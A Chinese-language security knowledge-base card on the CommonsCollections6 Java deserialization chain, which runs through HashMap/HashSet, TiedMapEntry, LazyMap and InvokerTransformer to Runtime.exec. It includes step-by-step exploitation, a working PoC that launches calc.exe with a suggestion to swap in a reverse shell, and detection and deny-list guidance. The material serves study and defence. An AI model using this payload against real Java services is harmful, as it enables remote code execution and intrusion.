---
id: web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer
title: CommonsCollections6 经典链：HashMap/HashSet 触发 TiedMapEntry.hashCode→LazyMap.get→InvokerTransformer 执行 Runtime.exec（含假 Transformer/反射改 iTransformers/remove 键的构造时序）
type: scenario
domain: web
path: web/java/deserialization
technique: cc6-hashmap-hashset-lazymap-invokertransformer-rce
tags:
- java
- deserialization
- commons-collections
- cc6
- tiedmapentry
- lazymap
- hashmap
- hashset
- chainedtransformer
- invokertransformer
- rce
cve: []
severity: high
confidence: high
status: verified
affected_versions: Commons Collections <= 3.2.1
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T1-1
  verified_at: '2026-11-07T22:17:17+08:00'
  notes: '已对照原文与 23 张图片逐张核对：TiedMapEntry.getValue→map.get 与 hashCode/toString 调用 getValue、HashMap.readObject→putVal(hash(key))→key.hashCode、put/add 阶段提前触发弹计算器、NotSerializableException: java.lang.ProcessImpl、假 ChainedTransformer + 反射改 iTransformers、循环引用与独立 innermap 容器、LazyMap.get 仅 containsKey==false 时 transform、innermap.remove(key)、ysoserial HashSet.readObject→map.put(e,PRESENT) gadget chain、最终 HashMap/HashSet 两版 PoC 均成功弹计算器，与 content.md 一致；为完整打通并实测的 RCE 链，非 DoS/未打通/只有原语/理论链；路径合法，dedup 非同链（cc6-cc3-templatesimpl 仅共享触发段、sink 不同）、dup-scan 无 pair；原文明确写受影响区间已 set-versions『Commons Collections <= 3.2.1』；未验证点：未在本机编译运行，该批次卡按 KB 现状不含 sources/source_url 溯源字段。'
url: /docs/web/java/deserialization/web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer/
draft: false
kb_aliases:
- CC6
- CommonsCollections6
- TiedMapEntry.hashCode
- HashMap.readObject 触发
- HashSet.readObject 触发
- 假 ChainedTransformer
- iTransformers 反射替换
- innerMap.remove 键
- InvokerTransformer Runtime.exec
---

## 一句话结论

在 Commons Collections <= 3.2.1 环境中，用 `HashMap.readObject()`（或 ysoserial 的 `HashSet.readObject()`）计算 key 哈希时调用 `TiedMapEntry.hashCode()` → `getValue()` → `LazyMap.get()` → `ChainedTransformer` → `InvokerTransformer` → `Runtime.exec()`，即可在 JDK 8u71+（不再依赖 `AnnotationInvocationHandler`）完成反序列化 RCE；构造 payload 时必须处理三个时序坑：`put`/`add` 提前触发整条链、需要假 `ChainedTransformer` + 反射改 `iTransformers`、`LazyMap.get` 只在键不存在时触发故要 `innerMap.remove(key)`，并避免把 `TiedMapEntry` 放进被 `LazyMap` 装饰的同一个 map 造成循环引用。

## 原理

- **为什么需要 CC6**：Java 8u71 后 `AnnotationInvocationHandler.readObject` 改为新建 `LinkedHashMap` 装键值对，不再操作攻击者传入的原始 Map，也没有 `memberValues.setValue()`，导致 CC1 的 `TransformedMap.checkSetValue` 与 `LazyMap.get` 两条路都失效。CC6 改找「不经过 `AnnotationInvocationHandler` 且能触发 `LazyMap.get()`」的入口，因此对 JDK 版本不敏感。
- **触发段（HashMap 版）**：`HashMap.readObject()` 逐个读 key/value 并 `putVal(hash(key), key, value, ...)`；`HashMap.hash(key)` 调用 `key.hashCode()`；若 key 是 `TiedMapEntry`，其 `hashCode()` 为 `getValue().hashCode() ^ getKey().hashCode()`，而 `TiedMapEntry.getValue()` 实现是 `return map.get(key)`，`map` 与 `key` 由构造器可控 → 把 `map` 设成 `LazyMap` 即调用 `LazyMap.get(key)`。
- **触发段（HashSet 版，ysoserial CommonsCollections6）**：`HashSet` 内部用 `transient HashMap<E,Object> map` 存储，`HashSet.readObject()` 对每个反序列化出的元素执行 `map.put(e, PRESENT)`，`HashSet.add(e)` 同样是 `map.put(e, PRESENT)`；`HashMap.put` 与 `readObject` 一样走 `putVal(hash(key), ...)`，故同样触发 `TiedMapEntry.hashCode` → `LazyMap.get`，且 `add` 让元素 `e` 攻击者可控。
- **攻击段**：`LazyMap.get(key)` 在 `map.containsKey(key)==false` 时调用 `factory.transform(key)`（`factory` 即 `ChainedTransformer`），结果写回 `map.put(key,value)` 缓存；`ChainedTransformer` 依次执行 `ConstantTransformer(Runtime.class)` → `InvokerTransformer("getMethod", ...)` → `InvokerTransformer("invoke", ...)` → `InvokerTransformer("exec", {"calc.exe"})`，最终 `Runtime.getRuntime().exec()` 执行命令。链尾可加一个 `ConstantTransformer(1)` 吞掉进程对象、避免把 `java.lang.ProcessImpl` 写进 Map。
- **三个构造时序坑（这是 CC6 能否落地的关键）**：
  1. **生成阶段提前触发**：`map.put(tiedMapEntry,"v")` / `HashSet.add(tiedMapEntry)` 本身就会调用 `hash(key)`，在序列化之前就把整条链跑一遍，本机弹计算器；且 `exec` 返回 `ProcessImpl` 不可序列化，导致 `NotSerializableException: java.lang.ProcessImpl`，payload 根本写不出。解法：先用「假链」`new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)})` 构造并 put/add，之后 `Field f = chain.getClass().getDeclaredField("iTransformers"); f.setAccessible(true); f.set(chain, 真transformers)` 反射替换。
  2. **缓存键导致反序列化不触发**：`LazyMap.get` 只在键不存在时才 `transform`，构造过程中（`TiedMapEntry(lazyMap,"111")` 或 put 触发的 transform）已把该 key 写进 innerMap；反序列化时 `containsKey==true` 直接返回缓存，不再执行。解法：`innermap.remove("111")`（等价 `lazyMap.clear()`）删除缓存键。
  3. **循环引用/键值污染**：若把 `TiedMapEntry` 放进「被 LazyMap 装饰的同一个 map」（外层 HashMap 同时充当 innerMap），会形成 `map 包含 entry → entry 指向 LazyMap → LazyMap 装饰 map` 的循环，反序列化时 LazyMap 已部分初始化、key 类型异常（调试中表现为 `HashMap.readObject` 的 key 变成 String 而非 TiedMapEntry）。解法：用**独立的外层容器**——`innermap` 专门给 `LazyMap.decorate` 装饰，另建一个 `HashMap`（或 `HashSet`）放 `TiedMapEntry`。

## 触发条件

- 目标使用 Java 原生 `ObjectInputStream.readObject` 反序列化不可信数据，且能控制被反序列化对象的字段/容器。
- classpath 存在 Commons Collections <= 3.2.1（3.2.2 起 `FunctorUtils.checkUnsafeSerialization()` 禁用相关 Transformer 反序列化，链失效）；JDK 版本不限（不依赖 `AnnotationInvocationHandler`）。
- 攻击段 `InvokerTransformer` 可用（未被 JEP 290 `ObjectInputFilter` / RASP 拦截），`Runtime.exec` 命令可落地。
- 构造 payload 时能按上述三点处理时序（假链 + 反射改字段 + 删键 + 独立容器）。

## 利用步骤

1. 构造真 `ChainedTransformer`：`ConstantTransformer(Runtime.class)` + `InvokerTransformer(getMethod→getRuntime)` + `InvokerTransformer(invoke)` + `InvokerTransformer(exec→命令)` + 可选 `ConstantTransformer(1)`。
2. 用假链 `ChainedTransformer(new ConstantTransformer(1))` 调 `LazyMap.decorate(innermap, 假chain)`，再 `new TiedMapEntry(lazyMap, "111")`。
3. 选入口容器：
   - HashMap 版：`HashMap map = new HashMap(); map.put(tiedMapEntry,"v");`
   - HashSet 版：`HashSet map = new HashSet(); map.add(tiedMapEntry);`（对应 `HashSet.readObject → map.put(e,PRESENT)`）。
   注意这里用的是**独立容器**，不要复用 `innermap`。
4. `innermap.remove("111")` 删掉构造函数/put 写入的缓存键，保证反序列化时 `LazyMap.get` 走 `transform`。
5. 反射把假链的 `iTransformers` 字段替换为真 `transformers` 数组。
6. `ObjectOutputStream.writeObject(map)` 序列化，`ObjectInputStream.readObject()` 触发：`HashMap/HashSet.readObject → put → hash(key) → TiedMapEntry.hashCode → getValue → LazyMap.get → ChainedTransformer → Runtime.exec`。
7. 验证命令执行（如弹计算器），再按目标环境替换命令（反弹 shell / 写文件）。

## PoC

HashMap 版最小骨架：

```java
Transformer[] fake = { new ConstantTransformer(1) };
Transformer[] real = {
  new ConstantTransformer(Runtime.class),
  new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",new Class[0]}),
  new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{null,new Object[0]}),
  new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
  new ConstantTransformer(1)
};
ChainedTransformer chain = new ChainedTransformer(fake);

Map innermap = new HashMap();
Map lazyMap = LazyMap.decorate(innermap, chain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "111");
HashMap map = new HashMap();          // 独立外层容器，避免循环引用
map.put(entry, "v");                  // 假链，不真正执行
innermap.remove("111");               // 删缓存键，保证 get 触发 transform

Field f = chain.getClass().getDeclaredField("iTransformers");
f.setAccessible(true); f.set(chain, real);
// serialize(map) -> 目标 readObject 触发 RCE
```

HashSet 版差异行：

```java
HashSet set = new HashSet();
set.add(entry);                       // add 内部 map.put(e, PRESENT) 同样触发 hash(key)
innermap.remove("111");
// 反射改 iTransformers 后 serialize(set)
// HashSet.readObject -> HashMap.put -> hash(key) -> TiedMapEntry.hashCode -> ...
```

（按文章 PoC 最小化整理，未在本机编译运行；`Field`/`iTransformers` 为反射替换假链的关键。）

## 变体与关联

- 变体：入口容器换成 `HashMap`（直接 `readObject`）或 `HashSet`（`readObject → put`），两者都收敛到 `TiedMapEntry.hashCode → LazyMap.get`；也可用 `Hashtable`（见 CC7）等其它会调用 `hashCode`/`equals` 的容器。
- 变体：攻击段换成 CC3 的 `InstantiateTransformer + TrAXFilter + TemplatesImpl` 加载字节码（更隐蔽），或换成其它 `InvokerTransformer` 反射目标；链尾 `ConstantTransformer(1)` 可去掉但要注意 `ProcessImpl` 序列化报错。
- 变体：`innermap.remove(key)` 可等价写作 `lazyMap.clear()`；假链也可用其它无害 `Transformer`。
- 关联：[[web-java-deser-commonscollections-cc6-cc3-templatesimpl]]（同一 CC6 触发段，但攻击段用 CC3 TemplatesImpl 字节码加载）、[[web-java-deser-commonscollections-cc1-lazymap-proxy]]（CC1 依赖 AnnotationInvocationHandler，8u71+ 失效）、[[web-java-deser-commonscollections-cc5-badattribute-tostring]]、`[[web-java-deser-commonscollections-cc7-hashtable-equals-lazymap]]`、[[web-java-deser-commonscollections-322-jsonobject-getter-bypass]]（3.2.2 后的替代）。
- 局限：强依赖 CC <= 3.2.1；JEP 290 白名单 / RASP 拦截 `InvokerTransformer`、`Runtime.exec` 时失效；命令有副作用会在构造期误触发（必须用假链）。

## 检测与防御

- 检测：反序列化流量/文件里检索 `TiedMapEntry`、`LazyMap`、`ChainedTransformer`、`InvokerTransformer`、`ConstantTransformer`、`HashSet`/`HashMap` 组合类名；监控反序列化后加载新类、反射调用 `getMethod/invoke`、`Runtime.exec` 与子进程创建。
- 修复：升级 Commons Collections 到 3.2.2+ 并保持 `enableUnsafeSerialization` 关闭；避免对外暴露原生 Java 反序列化入口，改用 JSON 等数据格式；对必须反序列化的入口做签名与来源校验。
- 加固：配置 JEP 290 `ObjectInputFilter` 类白名单（拒绝 `org.apache.commons.collections.functors.*`、`TiedMapEntry`、`LazyMap`）；升级 JDK 并限制内部危险类访问。
